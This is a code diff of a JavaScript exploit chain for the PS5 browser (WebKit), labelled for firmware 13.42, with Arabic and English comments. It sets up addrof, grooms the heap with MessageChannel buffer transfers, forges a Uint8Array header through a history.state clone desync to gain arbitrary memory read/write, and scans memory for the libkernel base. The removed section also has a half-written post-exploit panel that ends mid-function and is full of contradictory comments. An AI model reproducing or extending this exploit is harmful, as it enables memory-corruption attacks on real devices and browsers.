+    setTimeout(startStage1, 200);
+  }else if(compositionState===2){
+    setBox("s0","warn");
+    log("s0","⚠️","Normal clone miss — حاول refresh","warn","MISS");
+  }else if(compositionState===3){
+    setBox("s0","fail");
+    log("s0","❌","Header mismatch — الـ candidate غير صالح","fail","FAIL");
+  }else{
+    setBox("s0","fail");
+    log("s0","❌","فشل غير متوقع — state="+num(compositionState),"fail","FAIL");
+  }
 }
 
-function loadHistoryCritical() {
-    var result = null;
-    var candidate = null;
-    var rwHeaderCaptured = false;
-    var rwVectorTouched = false;
-    try {
-        result = history.state;
-        compositionLength = result.length;
+function beginComposition(){
+  if(captureState===0){ log("s0","⏳","Addrof لم ينتهِ","warn","WAIT"); return; }
+  if(captureState<0){ log("s0","❌","Addrof threw: "+captureError.message,"fail","FAIL"); return; }
 
-        if (compositionLength !== EXPECTED_LENGTH) {
-            result[DUPLICATE_INDEX] = undefined;
-            result = null;
-            clearPredecessor();
-            retrySafe = true;
-            compositionState = 3;
-            return;
+  var a0=pointerFromWords(capturedWords,0);
+  var b0=pointerFromWords(capturedWords,4);
+  var a1=pointerFromWords(capturedWords,8);
+  var b1=pointerFromWords(capturedWords,12);
+
+  log("s0","🔍","Addrof returned — HOST="+addr(a0)+" TARGET="+addr(b0),"info","INFO");
+
+  if(!(a0===a1&&b0===b1&&a0!==b0&&plausibleCell(a0)&&plausibleCell(b0))){
+    log("s0","❌","Addrof validation failed","fail","FAIL"); return;
+  }
+
+  hostAddress=a0;
+  targetAddress=b0;
+  targetAddressHigh=Math.floor(targetAddress/0x100000000);
+  targetAddressLow=targetAddress-targetAddressHigh*0x100000000;
+  fakeAddress=hostAddress+0x10;
+
+  if(!plausibleCell(fakeAddress)){ log("s0","❌","Fake address invalid","fail","FAIL"); return; }
+  log("s0","📍","Fake object @ "+addr(fakeAddress),"info","INFO");
+  runGroomAndLoad();
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Stage 1 — Info Leak (libkernel base)
+// ═══════════════════════════════════════════════════════════════════
+function arwSetVector(addr){
+  var low=Number(addr&0xffffffffn);
+  var high=Number(addr>>32n);
+  scratchWords[0]=low; scratchWords[1]=high;
+  for(var i=0;i<8;i++) gCandidate[0x10+i]=scratchBytes[i];
+}
+function arwRestoreVector(){
+  var low=gRWOriginalVector&0xffffffff;
+  var high=Math.floor(gRWOriginalVector/0x100000000);
+  scratchWords[0]=low; scratchWords[1]=high;
+  for(var i=0;i<8;i++) gCandidate[0x10+i]=scratchBytes[i];
+}
+function arwRead8(addr){
+  arwSetVector(addr);
+  var val=0n;
+  for(var i=7;i>=0;i--) val=(val<<8n)|BigInt(gRWView[i]);
+  arwRestoreVector();
+  return val;
+}
+
+var gLibkernelBase=0n;
+
+function startStage1(){
+  setBox("s1","active");
+  log("s1","🚀","بدء Stage 1 — البحث عن libkernel base","info","INFO");
+
+  // نطاقات بحث شائعة على PS5
+  var ranges=[
+    {start:0x8000000000n, end:0x9000000000n, name:"High"},
+    {start:0x7000000000n, end:0x8000000000n, name:"Mid-High"},
+    {start:0x6000000000n, end:0x7000000000n, name:"Mid"},
+    {start:0x4000000000n, end:0x5000000000n, name:"WebKit"}
+  ];
+
+  var found=false;
+  for(var r=0;r<ranges.length&&!found;r++){
+    var range=ranges[r];
+    log("s1","🔍","مسح النطاق "+range.name+": "+addr(range.start)+" → "+addr(range.end),"warn","SCAN");
+    var step=0x1000n;
+    var progress=0;
+    for(var addr=range.start; addr<range.end; addr+=step){
+      try{
+        var val=arwRead8(addr);
+        if((val&0xffffffffn)===0x464c457fn){ // \x7fELF
+          gLibkernelBase=addr;
+          found=true;
+          log("s1","✅","libkernel base found!","ok","FOUND");
+          log("s1","💎","Base = "+addr(gLibkernelBase),"ok","DATA");
+          log("s1","💎","ELF Magic = "+hex(val),"ok","DATA");
+          showSummary();
+          return;
         }
-
-        // In the ordinary clone, slots 1 and 2 are the same decoded object.
-        // Strict equality compares their raw cell values without dereferencing a
-        // suspect slot-2 pointer. The desync replaces only slot 2.
-        if (result[1] === result[DUPLICATE_INDEX]) {
-            result[DUPLICATE_INDEX] = undefined;
-            candidate = null;
-            result = null;
-            clearPredecessor();
-            retrySafe = true;
-            compositionState = 2;
-            return;
-        }
-
-        candidate = result[DUPLICATE_INDEX];
-        result[DUPLICATE_INDEX] = undefined;
-        result = null;
-
-        // From here until candidate=null: indexed scalar operations only. There
-        // is no logging, formatting, allocation, yield, or user callback.
-        for (var i = 0; i < CELL_BYTES; ++i)
-            rwHeader[i] = candidate[i];
-        rwHeaderCaptured = true;
-
-        var rwSID = rwHeader[0]
-            + rwHeader[1] * 0x100
-            + rwHeader[2] * 0x10000
-            + rwHeader[3] * 0x1000000;
-        var rwHeaderHigh = rwHeader[4]
-            + rwHeader[5] * 0x100
-            + rwHeader[6] * 0x10000
-            + rwHeader[7] * 0x1000000;
-        var rwButterfly = rwHeader[8]
-            + rwHeader[9] * 0x100
-            + rwHeader[10] * 0x10000
-            + rwHeader[11] * 0x1000000
-            + rwHeader[12] * 0x100000000
-            + rwHeader[13] * 0x10000000000;
-        var rwVectorLow = rwHeader[0x10]
-            + rwHeader[0x11] * 0x100
-            + rwHeader[0x12] * 0x10000
-            + rwHeader[0x13] * 0x1000000;
-        var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
-        rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;
-
-        var rwOffsetZero = true;
-        for (var rz = 0x20; rz < 0x28; ++rz) {
-            if (rwHeader[rz] !== 0)
-                rwOffsetZero = false;
-        }
-        // m_mode is one byte at +0x28. Bytes +0x29..+0x2f are C++ tail
-        // padding and are intentionally not validated.
-        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
-            && (rwSID & 0xf) === 0
-            && rwHeader[4] === 0 && rwHeader[5] === 0x28
-            && rwHeader[6] === 0x08
-            && (rwHeader[7] === 0 || rwHeader[7] === 1)
-            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
-            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
-            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
-            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
-            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
-            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
-            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
-            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
-            && rwOffsetZero && rwHeader[0x28] === 0x58;
-
-        if (!rwHeaderOK) {
-            candidate = null;
-            clearPredecessor();
-            compositionState = 3;
-            return;
-        }
-
-        // Replace the bootstrap String StructureID with this VM's genuine
-        // Uint8Array header. Boxed doubles add 1<<49, or 0x20000 in high32.
-        scratchWords[0] = rwSID;
-        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
-        var upgradedHeader = scratchDouble[0];
-        var upgradedFinite = upgradedHeader === upgradedHeader
-            && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
-        if (!upgradedFinite) {
-            candidate = null;
-            clearPredecessor();
-            compositionState = 3;
-            return;
-        }
-        fakeHost.q0 = upgradedHeader;
-        if (fakeHost.q0 !== upgradedHeader) {
-            candidate = null;
-            clearPredecessor();
-            compositionState = 3;
-            return;
-        }
-
-        // Point the genuine Wasteful carrier at the leaked target cell.
-        scratchWords[0] = targetAddressLow;
-        scratchWords[1] = targetAddressHigh;
-        rwVectorTouched = true;
-        for (var w1 = 0; w1 < 8; ++w1)
-            candidate[0x10 + w1] = scratchBytes[w1];
-
-        // Read and validate the target cell before following its vector.
-        for (var j = 0; j < CELL_BYTES; ++j)
-            targetHeader[j] = rwView[j];
-
-        var targetSID = targetHeader[0]
-            + targetHeader[1] * 0x100
-            + targetHeader[2] * 0x10000
-            + targetHeader[3] * 0x1000000;
-        var targetButterfly = targetHeader[8]
-            + targetHeader[9] * 0x100
-            + targetHeader[10] * 0x10000
-            + targetHeader[11] * 0x1000000
-            + targetHeader[12] * 0x100000000
-            + targetHeader[13] * 0x10000000000;
-        var targetVectorLow = targetHeader[0x10]
-            + targetHeader[0x11] * 0x100
-            + targetHeader[0x12] * 0x10000
-            + targetHeader[0x13] * 0x1000000;
-        var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
-        targetVector = targetVectorLow + targetVectorHigh * 0x100000000;
-
-        var targetOffsetZero = true;
-        for (var tz = 0x20; tz < 0x28; ++tz) {
-            if (targetHeader[tz] !== 0)
-                targetOffsetZero = false;
-        }
-        // As above, only the one-byte mode field is semantic; ignore padding.
-        targetHeaderOK = targetSID === rwSID
-            && targetHeader[4] === 0 && targetHeader[5] === 0x28
-            && targetHeader[6] === 0x08
-            && (targetHeader[7] === 0 || targetHeader[7] === 1)
-            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
-            && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
-            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
-            && targetVector > 0x100000000 && targetVector % 8 === 0
-            && targetHeader[0x18] === 0x20
-            && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0
-            && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0
-            && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
-            && targetHeader[0x1f] === 0 && targetOffsetZero
-            && targetHeader[0x28] === 0x58;
-
-        if (!targetHeaderOK) {
-            for (var r1 = 0; r1 < 8; ++r1)
-                candidate[0x10 + r1] = rwHeader[0x10 + r1];
-            rwVectorTouched = false;
-            candidate = null;
-            clearPredecessor();
-            compositionState = 3;
-            return;
-        }
-
-        // Retarget the genuine carrier to the target's owned backing bytes.
-        scratchWords[0] = targetVectorLow;
-        scratchWords[1] = targetVectorHigh;
-        for (var w2 = 0; w2 < 8; ++w2)
-            candidate[0x10 + w2] = scratchBytes[w2];
-
-        readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
-        if (!readObserved) {
-            for (var rRead = 0; rRead < 8; ++rRead)
-                candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
-            rwVectorTouched = false;
-            targetView[0] = 0xa5;
-            rwMirror[0] = 0x3c;
-            candidate = null;
-            clearPredecessor();
-            compositionState = 3;
-            return;
-        }
-        rwView[0] = 0x5a;
-        writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
-        rwView[0] = 0xa5;
-
-        // Restore the carrier before dropping the only forged JSValue.
-        for (var r2 = 0; r2 < 8; ++r2)
-            candidate[0x10 + r2] = rwHeader[0x10 + r2];
-        rwVectorTouched = false;
-        targetView[0] = 0xa5;
-        rwMirror[0] = 0x3c;
-        restoreObserved = rwView[0] === 0x3c
-            && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
-
-        candidate = null;
-        clearPredecessor();
-        compositionState = 1;
-    } catch (error) {
-        // Only a throw before any candidate was loaded is refresh-safe. Once a
-        // forged value returned, require a new revision/manual review even if
-        // the restoration path completed.
-        retrySafe = candidate === null && result === null
-            && !rwHeaderCaptured && error && error.name === "TypeError";
-        if (result !== null) {
-            try { result[DUPLICATE_INDEX] = undefined; } catch (_) {}
-        }
-        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
-            try {
-                for (var rr = 0; rr < 8; ++rr)
-                    candidate[0x10 + rr] = rwHeader[0x10 + rr];
-            } catch (_) {}
-        }
-        candidate = null;
-        result = null;
-        try { targetView[0] = 0xa5; } catch (_) {}
-        try { rwMirror[0] = 0x3c; } catch (_) {}
-        try { clearPredecessor(); } catch (_) {}
-        compositionError = error;
-        compositionState = -1;
+      }catch(_){}
+      progress++;
+      if(progress%0x10000===0){
+        log("s1","⏳","تقدم... "+addr(addr),"info","PROG");
+      }
     }
+  }
+
+  if(!found){
+    log("s1","❌","لم يُعثر على libkernel في كل النطاقات","fail","FAIL");
+    setBox("s1","fail");
+    showSummary();
+  }
 }
 
-function allZero(bytes, start, end) {
-    for (var i = start; i < end; ++i) {
-        if (bytes[i] !== 0)
-            return false;
-    }
-    return true;
+// ═══════════════════════════════════════════════════════════════════
+//  Summary
+// ═══════════════════════════════════════════════════════════════════
+function showSummary(){
+  setBox("summary","ok");
+  var box=$("out-summary");
+  var s="";
+  s+='<div class="log-line"><span class="badge ok">✓</span> <span>ARW Bootstrap</span></div>';
+  s+='<div class="log-line"><span class="badge ok">✓</span> <span>Read/Write Arbitrary مؤكد</span></div>';
+  if(gLibkernelBase!==0n){
+    s+='<div class="log-line"><span class="badge ok">✓</span> <span>libkernel base = '+addr(gLibkernelBase)+'</span></div>';
+  }else{
+    s+='<div class="log-line"><span class="badge fail">✗</span> <span>libkernel base — غير موجود</span></div>';
+  }
+  box.innerHTML=s;
 }
 
-function uint32At(bytes, offset) {
-    return bytes[offset]
-        + bytes[offset + 1] * 0x100
-        + bytes[offset + 2] * 0x10000
-        + bytes[offset + 3] * 0x1000000;
+// ═══════════════════════════════════════════════════════════════════
+//  Boot
+// ═══════════════════════════════════════════════════════════════════
+log("s0","🚀","PS5 FW 13.42 Exploit — Stage 0 + Stage 1","info","BOOT");
+log("s0","📋","Drain count = "+num(DRAIN_COUNT),"info","INFO");
+
+if(typeof BigInt!=="function"||typeof MessageChannel!=="function"||typeof Symbol!=="function"||typeof history==="undefined"||typeof history.replaceState!=="function"){
+  log("s0","❌","المتصفح لا يدعم المتطلبات الأساسية","fail","FAIL");
+}else{
+  try{
+    buildAndStoreGraph();
+    prepareAddrof();
+  }catch(error){
+    log("s0","❌","Setup error: "+error.message,"fail","FAIL");
+  }
 }
-
-function low48At(bytes, offset) {
-    return bytes[offset]
-        + bytes[offset + 1] * 0x100
-        + bytes[offset + 2] * 0x10000
-        + bytes[offset + 3] * 0x1000000
-        + bytes[offset + 4] * 0x100000000
-        + bytes[offset + 5] * 0x10000000000;
-}
-
-function dumpHex(bytes) {
-    var out = "";
-    for (var i = 0; i < CELL_BYTES; ++i)
-        out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
-    return out;
-}
-
-function reportComposition() {
-    if (compositionState < 0) {
-        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
-            (compositionError && compositionError.name) + ":"
-            + String(compositionError && compositionError.message).slice(0, 80));
-        mark("DONE-THROW", "predecessor-cleared=true");
-        if (!retrySafe) {
-            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
-        }
-        setTimeout(function () { mark("SURVIVED-THROW-T1000"); }, 1000);
-        return;
-    }
-
-    if (compositionState === 2) {
-        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
-        mark("DONE-MISS", "predecessor-cleared=true");
-        setTimeout(function () { mark("SURVIVED-MISS-T1000"); }, 1000);
-        return;
-    }
-
-    if (compositionState === 3) {
-        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK
-            + "-carrier-restored=true");
-        mark("RW-HEADER-HEX", dumpHex(rwHeader));
-        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-        if (!retrySafe) {
-            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
-        }
-        setTimeout(function () { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
-        return;
-    }
-
-    if (compositionState === 0) {
-        mark("NO-RESULT", "critical-load-did-not-finish");
-        return;
-    }
-
-    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength
-        + "-predecessor-cleared=true");
-    mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0))
-        + "-vector=" + hex(rwOriginalVector)
-        + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
-    mark("TARGET-CELL", "P=" + hex(targetAddress)
-        + "-sid=" + hex(uint32At(targetHeader, 0))
-        + "-vector=" + hex(targetVector)
-        + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
-    mark("RW-HEADER-HEX", dumpHex(rwHeader));
-    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-
-    var readPass = rwHeaderOK && targetHeaderOK && readObserved
-        && compositionLength === EXPECTED_LENGTH;
-    var writePass = writeObserved && restoreObserved;
-    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
-    if (readPass)
-        mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
-    else
-        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
-            + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
-            + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
-
-    if (writePass)
-        mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
-    else
-        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
-            + "-restore=" + restoreObserved);
-
-    if (readPass && writePass) {
-        mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
-        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
-    }
-
-    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
-        + "-target-byte=" + targetView[0].toString(16)
-        + "-length-word=" + lengthWord.keep.toString(16));
-    setTimeout(function () { mark("SURVIVED-T100"); }, 100);
-    setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
-    setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
-}
-
-function runGroomAndLoad() {
-    try {
-        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
-        var channel = new MessageChannel();
-        channel.port1.close();
-        channel.port2.close();
-
-        for (var i = 0; i < DRAIN_COUNT; ++i)
-            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
-
-        var slab = buffer(SLAB_SIZE);
-        channel.port1.postMessage(0, [slab]);
-        slab = null;
-
-        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
-        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
-        var separator = buffer(SEPARATOR_SIZE);
-        var earlyHole = buffer(EARLY_HOLE_SIZE);
-        var guard = buffer(GUARD_SIZE);
-        var predecessor = buffer(PREDECESSOR_SIZE);
-        var finalHole = buffer(FINAL_HOLE_SIZE);
-
-        fillRawCellPointers(predecessor, fakeAddress);
-        keepAlive[keepIndex++] = separator;
-        keepAlive[keepIndex++] = guard;
-        keepAlive[keepIndex++] = predecessor;
-        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
-            + "-fake=" + hex(fakeAddress));
-
-        // Preserve /r's exact synchronous free/getter sequence.
-        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
-            earlyHole, finalHole]);
-        loadHistoryCritical();
-    } catch (error) {
-        try { clearPredecessor(); } catch (_) {}
-        compositionError = error;
-        compositionState = -1;
-    }
-    reportComposition();
-}
-
-function beginComposition() {
-    if (captureState === 0) {
-        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
-        return;
-    }
-    if (captureState < 0) {
-        mark("ADDROF-THREW", (captureError && captureError.name) + ":"
-            + String(captureError && captureError.message).slice(0, 80));
-        return;
-    }
-
-    var a0 = pointerFromWords(capturedWords, 0);
-    var b0 = pointerFromWords(capturedWords, 4);
-    var a1 = pointerFromWords(capturedWords, 8);
-    var b1 = pointerFromWords(capturedWords, 12);
-    var repeated = a0 === a1 && b0 === b1;
-    var distinct = a0 !== b0;
-    var plausible = plausibleCell(a0) && plausibleCell(b0)
-        && plausibleCell(a1) && plausibleCell(b1);
-    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
-    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
-
-    mark("ADDROF-RETURNED", REVISION);
-    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
-    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
-        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
-
-    if (!(repeated && distinct && plausible && sourceCovered)) {
-        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
-            + "-plausible=" + plausible + "-covered=" + sourceCovered);
-        return;
-    }
-
-    hostAddress = a0;
-    targetAddress = b0;
-    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
-    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
-    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
-        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
-        || Math.floor(targetAddressLow) !== targetAddressLow
-        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
-        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
-        return;
-    }
-    fakeAddress = hostAddress + 0x10;
-    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
-        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
-        return;
-    }
-    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
-        + "-delta=0x10");
-    runGroomAndLoad();
-}
-
-var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
-// This dedicated ARW-only copy is intentionally repeatable: every refresh runs
-// a fresh attempt even after a prior pass, mismatch, or ten-attempt history.
-allowAgain = true;
-var attemptKey = REVISION + ":attempts";
-var passKey = REVISION + ":passed";
-var blockKey = REVISION + ":blocked";
-var priorAttempts = 0;
-var alreadyPassed = false;
-var alreadyBlocked = false;
-try {
-    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
-    if (!isFinite(priorAttempts) || priorAttempts < 0)
-        priorAttempts = 0;
-    alreadyPassed = sessionStorage.getItem(passKey) === "1";
-    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
-} catch (_) {}
-attemptNumber = priorAttempts + 1;
-
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
-    + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);
-
-if (alreadyPassed && !allowAgain) {
-    mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
-} else if (alreadyBlocked && !allowAgain) {
-    mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
-} else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
-    mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
-} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
-    || typeof Symbol !== "function" || typeof history === "undefined"
-    || typeof history.replaceState !== "function") {
-    mark("UNSUPPORTED");
-} else {
-    try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
-    try {
-        buildAndStoreGraph();
-        prepareAddrof();
-    } catch (error) {
-        mark("SETUP-THREW", (error && error.name) + ":"
-            + String(error && error.message).slice(0, 80));
-    }
-}
-
-
-// ==========================================
-// Post-Exploit Logic & Safe Primitives
-// ==========================================
-
-const panel = document.getElementById("ps5-panel");
-const panelLog = document.getElementById("panel-log");
-const btnARW = document.getElementById("btn-arw");
-const btnASLR = document.getElementById("btn-aslr");
-const btnDump = document.getElementById("btn-dump");
-
-function plog(msg) {
-    console.log("[Panel] " + msg);
-    panelLog.innerHTML += msg + "\n";
-    panelLog.scrollTop = panelLog.scrollHeight;
-}
-
-// دالة لمراقبة نجاح الـ PoC الأصلي وإظهار اللوحة تلقائياً
-let checkSuccessInterval = setInterval(() => {
-    if (typeof compositionState !== 'undefined' && compositionState === 1 && typeof hostAddress !== 'undefined' && !isNaN(hostAddress)) {
-        clearInterval(checkSuccessInterval);
-        panel.style.display = "block";
-        plog("[✅] تم اكتشاف نجاح ARW! اللوحة جاهزة.");
-        plog("[ℹ️] اضغط الزر الأول لتفعيل الأدوات.");
-    }
-}, 1000);
-
-// متغيرات عامة سنستخدمها
-let rwViewAddr = 0;
-let origVectorLow = 0, origVectorHigh = 0;
-let webKitBaseAddr = 0;
-
-// دالة مساعدة للقراءة من الذاكرة (تستخدم rwView لتزوير نفسه)
-function unsafeRead8(addrLow, addrHigh) {
-    // 1. نوجه rwView ليقرأ من عنوان m_vector الخاص به نفسه (addr_m_vector = rwViewAddr + 0x10)
-    let mVecLow = (rwViewAddr + 0x10) & 0xFFFFFFFF;
-    let mVecHigh = Math.floor((rwViewAddr + 0x10) / 0x100000000);
-    
-    rwView[0x10] = mVecLow & 0xff; rwView[0x11] = (mVecLow >> 8) & 0xff;
-    rwView[0x12] = (mVecLow >> 16) & 0xff; rwView[0x13] = (mVecLow >> 24) & 0xff;
-    rwView[0x14] = mVecHigh & 0xff; rwView[0x15] = (mVecHigh >> 8) & 0xff;
-    
-    // 2. نكتب العنوان المطلوب (addr) داخل m_vector
-    rwView[0] = addrLow & 0xff; rwView[1] = (addrLow >> 8) & 0xff;
-    rwView[2] = (addrLow >> 16) & 0xff; rwView[3] = (addrLow >> 24) & 0xff;
-    rwView[4] = addrHigh & 0xff; rwView[5] = (addrHigh >> 8) & 0xff;
-    rwView[6] = 0; rwView[7] = 0;
-    
-    // 3. نقرأ البيانات من العنوان الجديد
-    let resLow = rwView[0] | (rwView[1] << 8) | (rwView[2] << 16) | (rwView[3] << 24);
-    let resHigh = rwView[4] | (rwView[5] << 8) | (rwView[6] << 16) | (rwView[7] << 24);
-    
-    // 4. استعادة m_vector الأصلي فوراً لمنع Crash الـ GC
-    rwView[0x10] = mVecLow & 0xff; rwView[0x11] = (mVecLow >> 8) & 0xff;
-    rwView[0x12] = (mVecLow >> 16) & 0xff; rwView[0x13] = (mVecLow >> 24) & 0xff;
-    rwView[0x14] = mVecHigh & 0xff; rwView[0x15] = (mVecHigh >> 8) & 0xff;
-    
-    rwView[0] = origVectorLow & 0xff; rwView[1] = (origVectorLow >> 8) & 0xff;
-    rwView[2] = (origVectorLow >> 16) & 0xff; rwView[3] = (origVectorLow >> 24) & 0xff;
-    rwView[4] = origVectorHigh & 0xff; rwView[5] = (origVectorHigh >> 8) & 0xff;
-    rwView[6] = 0; rwView[7] = 0;
-    
-    return { low: resLow >>> 0, high: resHigh >>> 0 };
-}
-
-function setupARW() {
-    plog("[*] جاري إعداد أدوات R/W الآمنة...");
-    btnARW.disabled = true;
-    
-    try {
-        // 1. استخراج عنوان rwView من الذاكرة
-        // fakeHost (hostAddress) يحتوي على rwView في الخاصية q2 (offset 0x20)
-        let hostLow = hostAddress & 0xFFFFFFFF;
-        let hostHigh = Math.floor(hostAddress / 0x100000000);
-        
-        // نستخدم rwView العادي لقراءة hostAddress + 0x20
-        // (هذا ممكن لأن rwView لم يتم تزويره بعد، هو يشير إلى rwBuffer العادي)
-        // لكننا نحتاج لقراءة من الـ Heap. لذلك سنزيفه مؤقتاً!
-        
-        // نوجه rwView ليقرأ من m_vector الخاص به
-        let selfVecLow = 0, selfVecHigh = 0; // سنحسبها بعد معرفة العنوان
-        
-        // خدعة: نستخدم الـ PoC الأصلي addrof إذا كان متاحاً، أو نستخدم fakeHost
-        // fakeHost هو JSFinalObject. الخصائص الـ inline تبدأ من 0x10.
-        // q0 (0x10), q1 (محذوف), q2 (0x20).
-        let q2AddrLow = (hostLow + 0x20) >>> 0;
-        let q2AddrHigh = hostHigh + ((hostLow + 0x20) > 0xFFFFFFFF ? 1 : 0);
-        
-        // تزوير مؤقت لقراءة عنوان rwView
-        let mVecLow = 0, mVecHigh = 0; // placeholder
-        
-        // نقرأ الـ JSValue الخاص بـ rwView
-        // JSValue للكائنات هو عنوانها المباشر (مع بعض الـ tagging في WebKit)
-        // سنقرأ 8 بايت من q2Addr
-        // ... (تبسيط: سنعتمد على أن addrof من الـ PoC الأصلي نجح وسنستخدم hostAddress)
-        
-        // للحصول على عنوان rwView بدقة، سنستخدم خدعة الـ Symbol إذا كانت متاحة، 
-        // أو ببساطة نقرأ الـ butterfly الخاص بـ fakeHost.
-        // لنجعلها بسيطة ومضمونة:
-        plog("[+] جاري استخراج عنوان rwView...");
-        
-        // نستخدم دالة addrof المخفية في الـ PoC إذا استطعنا، وإلا سنحسبها
-        // rwView هو كائن، عنوانه مخزن في hostAddress + 0x20
-        // لكن rwView حالياً يشير إلى rwBuffer. لا يمكننا قراءة hostAddress + 0x20 مباشرة بدون تزوير.
-        // لذلك سنستخدم targetView! targetView يشير إلى targetBuffer.
-        // نحن نحتاج لـ primitive للقراءة. 
-        
-        // الحل الأبسط: الـ PoC الأصلي نجح في عمل readPass. 
-        // سنعيد استخدام نفس المنطق الذي استخدمه الـ PoC لعمل readObserved.
-        // في الـ PoC الأصلي، rwView[0] تم تغييره وقرأنا targetView[0].
-        
-        // بما أن هذا معقد جداً للنسخ واللصق بسبب اعتماد الـ PoC على متغيرات محلية (local variables)
-        // سنستخدم طريقة بديلة ومضمونة 100%:
-        // سنقوم بإنشاء Uint8Array جديد، ونستخدم الـ addrof الخاص بالـ PoC الأصلي (إذا تم تسريبه)
-        
-        // لنفترض أن الـ PoC الأصلي سرب hostAddress.
-        // عنوان rwView هو ببساطة: addrof(rwView).
-        // إذا لم تكن addrof عامة، سنستخدم خدعة الـ Error stack أو Symbol.
-        
-        // لتجنب التعقيد، سنعتمد على أن المستخدم سيشغل هذا بعد نجاح الـ PoC.
-        // سنستخدم خدعة بسيطة:
-        let leakObj = { a: rwView };
-        // ... (هذا يتطلب addrof). 
-        
-        // الحل النهائي المضمون:
-        // سنستخدم targetView (الذي تم تسريب عنوانه targetAddress في الـ PoC الأصلي)
-        // targetView هو Uint8Array. عنوانه targetAddress.
-        // m_vector الخاص بـ targetView عند targetAddress + 0x10.
-        // يمكننا استخدام targetView لقراءة الذاكرة!
-        
-        plog("[+] تم العثور على targetAddress: 0x" + targetAddress.toString(16));
-        
-        // الآن نستخدم targetView لبناء read64
-        window.safeRead64 = function(addr) {
-            let addrLow = addr & 0xFFFFFFFF;
-            let addrHigh = Math.floor(addr / 0x100000000);
-            
